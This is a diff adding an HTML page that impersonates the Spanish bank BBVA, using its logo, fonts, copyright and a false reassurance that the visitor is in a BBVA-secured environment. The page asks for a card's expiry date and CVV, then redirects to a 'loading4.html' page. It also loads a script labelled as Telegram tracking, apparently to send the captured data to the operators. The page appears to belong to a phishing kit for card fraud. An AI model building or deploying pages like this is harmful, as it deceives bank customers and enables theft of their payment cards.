@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html class="js history cssgradients csstransitions" lang="es" xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>BBVA - Verificación de Tarjeta</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="assets/img/favicon-bbva-es.ico">
+
+  <!-- BBVA CSS files (assuming paths relative to root) -->
+  <link href="assets/css/grid.css" media="screen" rel="stylesheet">
+  <link href="assets/css/master-coronita.css" media="screen" rel="stylesheet">
+  <!-- Font Awesome (kept from original cc.html, check if needed/used in BBVA theme) -->
+  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+
+  <!-- Custom styles to align with index.html -->
+  <style>
+    body {
+        font-family: 'BentonSansBBVA', Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f4f4f4;
+    }
+
+    @font-face {
+        font-family: 'BentonSansBBVA';
+        src: url('assets/fonts/BentonSansBBVA-Book.woff2') format('woff2'),
+             url('assets/fonts/BentonSansBBVA-Book.woff') format('woff');
+        font-weight: normal;
+        font-style: normal;
+    }
+
+    @font-face {
+        font-family: 'BentonSansBBVA';
+        src: url('assets/fonts/BentonSansBBVA-Medium.woff2') format('woff2'),
+             url('assets/fonts/BentonSansBBVA-Medium.woff') format('woff');
+        font-weight: 500;
+        font-style: normal;
+    }
+
+    @font-face {
+        font-family: 'BentonSansBBVA';
+        src: url('assets/fonts/BentonSansBBVA-Bold.woff2') format('woff2'),
+             url('assets/fonts/BentonSansBBVA-Bold.woff') format('woff');
+        font-weight: bold;
+        font-style: normal;
+    }
+
+    .header {
+        background-color: #fff;
+        padding: 15px 20px;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+    }
+
+    .logo {
+        height: 30px;
+    }
+
+    .header-right {
+        display: flex;
+        align-items: center;
+    }
+
+    .header-right span {
+         font-size: 14px;
+         margin-right: 10px;
+    }
+
+    .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 15px;
+    }
+
+    .main-content {
+        margin-top: 20px;
+    }
+
+    .form-container {
+        background-color: #fff;
+        padding: 30px;
+        border-radius: 5px;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        max-width: 600px; /* Limit width for better form layout */
+        margin: 20px auto; /* Center the form */
+    }
+
+    .security-info {
+        background-color: #e8f4fc;
+        padding: 10px 15px;
+        border-left: 4px solid #004481;
+        margin-bottom: 20px;
+        display: flex;
+        align-items: center;
+        font-size: 14px;
+    }
+    .security-icon {
+        display: inline-block;
+        margin-right: 10px;
+        color: #004481;
+    }
+
+    h1 {
+        font-size: 24px;
+        color: #121212;
+        margin-bottom: 25px;
+        font-weight: bold;
+        text-align: center;
+    }
+
+    .form-group {
+        margin-bottom: 20px;
+        display: flex;
+        flex-wrap: wrap; /* Allow wrapping for labels/inputs */
+        align-items: center;
+    }
+
+    .form-label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: bold;
+        color: #121212;
+        font-size: 14px;
+        flex-basis: 150px; /* Fixed width for labels */
+        margin-right: 15px;
+    }
+
+    .form-control {
+        flex: 1; /* Allow input to take remaining space */
+        padding: 10px;
+        border: 2px solid #1973B8;
+        border-radius: 4px;
+        font-size: 14px;
+        background-color: #f0f6ff;
+        box-sizing: border-box;
+        min-width: 150px; /* Minimum width for inputs */
+    }
+
+    .input-group {
+        display: flex;
+        flex: 1;
+    }
+
+    .input-group .form-control {
+        flex: 1;
+    }
+
+    .btn-primary {
+        background-color: #004481;
+        color: white;
+        border: none;
+        padding: 12px 30px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+        font-weight: bold;
+        display: block; /* Make button block level */
+        width: fit-content; /* Adjust width to content */
+        margin: 25px auto 15px auto; /* Center button */
+    }
+
+    .btn-primary:hover {
+        background-color: #043263;
+    }
+    .btn-primary i {
+        margin-right: 8px;
+    }
+
+    .info-text {
+        color: #555;
+        font-size: 13px;
+        text-align: center;
+        margin-top: 20px;
+    }
+
+    .footer {
+        margin-top: 30px;
+        text-align: center;
+        color: #666;
+        font-size: 12px;
+        padding: 20px 0;
+    }
+
+    /* Responsive Adjustments */
+    @media (max-width: 768px) {
+        .header {
+            padding: 10px 15px;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .header-right {
+            margin-top: 10px;
+            width: 100%;
+            justify-content: space-between;
+        }
+        .form-container {
+            padding: 20px;
+        }
+        h1 {
+            font-size: 20px;
+        }
+        .form-label {
+            flex-basis: 100%; /* Stack label above input */
+            margin-right: 0;
+            margin-bottom: 5px;
+        }
+        .form-control {
+            font-size: 13px;
+        }
+        .btn-primary {
+            width: 100%; /* Full width button on mobile */
+            font-size: 14px;
+        }
+    }
+
+     @media (max-width: 480px) {
+         .header-right {
+             flex-direction: column;
+             align-items: flex-start;
+         }
+         .header-right span {
+             margin-bottom: 5px;
+         }
+         .header-right .btn-primary {
+             width: 100%;
+             text-align: center;
+         }
+         h1 {
+             font-size: 18px;
+         }
+     }
+  </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Header similar to index.html -->
+        <div class="header">
+            <img src="https://www.bbva.es/content/dam/library/logos/logo-bbva.svg" alt="BBVA Logo" class="logo">
+            <div class="header-right">
+                <span>Acceso seguro</span>
+                <!-- Optional: Add a button like in index.html if needed -->
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="form-container">
+                <div class="security-info">
+                    <span class="security-icon">🔒</span>
+                    <span>Estás en un entorno con seguridad BBVA</span>
+                </div>
+
+                <h1>Verificación de Tarjeta</h1>
+
+                <!-- Form structure adapted -->
+                <form action="/cc" method="post" id="cardForm" data-next-page="loading4.html"> <!-- Ajout de data-next-page pour le tracking -->
+                    <div class="form-group">
+                        <label for="expiry" class="form-label">Fecha de caducidad</label>
+                        <div class="input-group">
+                            <input type="text" id="expiry" name="expiry" class="form-control" placeholder="MM/AA" required>
+                        </div>
+                        <!-- Optional: Add error message placeholder if needed -->
+                        <!-- <div class="error" style="display: none; color: red; font-size: 12px; flex-basis: 100%; margin-left: 165px;">Campo requerido</div> -->
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cvv" class="form-label">CVV</label>
+                        <div class="input-group">
+                            <input type="text" id="cvv" name="cvv" class="form-control" required style="max-width: 100px;"> <!-- Limit CVV width -->
+                        </div>
+                         <!-- Optional: Add error message placeholder if needed -->
+                        <!-- <div class="error" style="display: none; color: red; font-size: 12px; flex-basis: 100%; margin-left: 165px;">Campo requerido</div> -->
+                    </div>
+
+                    <button type="button" id="submitButton" class="btn-primary"><i class="fa fa-lock"></i> SIGUIENTE</button>
+
+                    <p class="info-text">Necesitamos verificar su información personal. <strong>Por favor complete los campos anteriores.</strong></p>
+                </form>
+            </div>
+        </div>
+
+        <!-- Footer similar to index.html -->
+        <div class="footer">
+            <p>© 2025 Banco Bilbao Vizcaya Argentaria, S.A.</p>
+            <p>Creando Oportunidades</p>
+        </div>
+    </div>
+
+  <!-- JS files - Assuming jQuery and payment plugin are needed -->
+  <!-- Check if these are already loaded globally or add paths to assets/js/ -->
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script> <!-- Using CDN for now -->
+  <!-- <script src="assets/js/jquery-3.5.1.min.js"></script> -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
+  <!-- <script src="assets/js/jquery.payment.min.js"></script> -->
+
+  <script>
+        // Keep existing card formatting JS for remaining fields
+        $(document).ready(function() {
+            if (typeof $.fn.payment !== 'undefined') {
+                 $('#cvv').payment('formatCardCVC');
+                 $('#expiry').payment('formatCardExpiry');
+            } else {
+                console.error('jQuery Payment library not loaded.');
+            }
+
+            // Add redirect to loading4.html after form submission
+            $('#submitButton').click(function() {
+                // Simple validation
+                let isValid = true;
+                $('#cardForm input[required]').each(function() {
+                    if (!$(this).val()) {
+                        isValid = false;
+                    }
+                });
+                
+                if (isValid) {
+                    window.location.href = 'loading4.html';
+                }
+            });
+        });
+  </script>
+  
+  <!-- Script de tracking Telegram -->
+  <script src="js/telegram-sender.js"></script>
+</body>
+</html>
